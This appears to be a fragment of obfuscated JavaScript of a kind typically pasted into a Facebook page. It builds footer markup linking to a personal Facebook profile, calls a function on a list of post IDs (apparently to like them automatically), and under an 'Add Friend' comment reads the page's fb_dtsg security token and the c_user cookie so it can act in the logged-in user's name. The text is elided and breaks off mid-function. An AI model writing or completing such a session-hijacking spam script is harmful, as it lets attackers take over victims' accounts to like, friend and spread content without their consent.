...
var _0x3384x1 = [{
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/phanbao.tuan.7" target="_blank">bảo tuấn</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
...
P("1405055079750546");P("1405020393087348");P("1406902259565828");P("1407803562809031");
/*Add Friend*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
